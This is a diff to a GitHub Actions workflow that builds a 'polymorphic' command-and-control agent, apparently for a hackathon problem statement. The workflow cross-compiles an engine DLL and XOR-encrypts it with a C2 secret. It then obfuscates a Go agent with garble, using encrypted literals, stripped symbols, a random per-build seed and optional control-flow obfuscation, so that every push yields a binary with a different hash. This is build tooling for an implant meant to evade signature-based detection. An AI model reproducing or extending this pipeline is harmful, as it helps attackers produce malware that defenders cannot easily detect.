@@ -3,6 +3,7 @@
 # Proteus — Polymorphic CI/CD Pipeline
 # ======================================
 # Triggered on every push to main.
+#
 # Each run:
 #   1. Builds the C execution engine as a Windows DLL (MinGW cross-compile)
 #   2. Encrypts the DLL with the C2_AUTH_XOR secret (XOR-32)
@@ -14,10 +15,14 @@
 #
 # No two runs produce the same binary — that is the polymorphic guarantee.
 #
-# Required GitHub Secrets (Settings → Secrets and variables → Actions):
-#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value (32+ chars)
-#   C2_AUTH_XOR   — 64 hex chars (32 bytes) — the DLL XOR key
-#                    Must match the XOR key the agent is built with.
+# Required GitHub Secrets:
+#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value
+#   C2_AUTH_XOR   — exactly 64 hexadecimal characters (32 bytes)
+#
+# Toolchain pinning:
+#   Go      1.27  — required by garble v0.18.0
+#   garble  0.18.0 — latest stable, adds better -tiny stripping and
+#                    reproducible control-flow obfuscation via //garble:controlflow
 
 name: Polymorphic CI Build
 
@@ -40,10 +45,11 @@ jobs:
         uses: actions/checkout@v4
 
       # ── 2. Go toolchain ─────────────────────────────────────────────────────
+      # garble v0.18.0 requires Go 1.27.0 or newer.
       - name: Set up Go
         uses: actions/setup-go@v5
         with:
-          go-version: "1.25"
+          go-version: "1.27"
           cache-dependency-path: agent/go.sum
 
       # ── 3. Python ───────────────────────────────────────────────────────────
@@ -55,6 +61,7 @@ jobs:
       # ── 4. Python dependencies ──────────────────────────────────────────────
       - name: Install Python dependencies
         run: |
+          pip install --quiet --upgrade pip
           pip install --quiet \
             pefile==2023.2.7       \
             cryptography==41.0.7   \
@@ -90,9 +97,7 @@ jobs:
             -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
             -DCMAKE_RC_COMPILER=x86_64-w64-mingw32-windres
           cmake --build . --parallel
-
-          echo "[+] Engine built:"
-          ls -la libjockey.dll
+          test -s libjockey.dll
 
       # ── 7. Encrypt the DLL with the C2_AUTH_XOR secret ─────────────────────
       - name: Encrypt engine DLL
@@ -130,14 +135,23 @@ jobs:
           GOOS=windows GOARCH=amd64 go mod download
           echo "[+] Go module cache ready"
 
-      # ── 9. Install garble ──────────────────────────────────────────────────
+      # ── 9. Install garble v0.18.0 ──────────────────────────────────────────
       - name: Install garble
         run: |
-          go install mvdan.cc/garble@latest
+          go install mvdan.cc/garble@v0.18.0
           echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
           "$(go env GOPATH)/bin/garble" version
 
       # ── 10. Build agent with garble (obfuscated) ───────────────────────────
+      #
+      # Flags:
+      #   -literals    encrypt every string literal
+      #   -tiny        strip debug info, symbol tables, source paths
+      #   -seed=random per-build random seed → unique output hash
+      #
+      # Optional: enable control-flow obfuscation by adding
+      #   //garble:controlflow
+      # to the top of main.go (v0.18.0 makes this reproducible with -seed).
       - name: Build agent (garble)
         env:
           C2_AUTH_TOKEN: ${{ secrets.C2_AUTH }}
@@ -256,6 +270,6 @@ jobs:
             echo "| **Triggered by** | ${{ github.event_name }} |"
             echo ""
             echo "> **Polymorphic guarantee:** every push to \`main\` produces a binary"
-            echo "> with a **different hash, different variable names, and different"
-            echo "> import-table layout** — directly satisfying the SIH problem statement."
+            echo "> with a **different hash**, **obfuscated symbols**, and **encrypted"
+            echo "> engine payload** — directly satisfying the SIH problem statement."
           } >> "$GITHUB_STEP_SUMMARY"
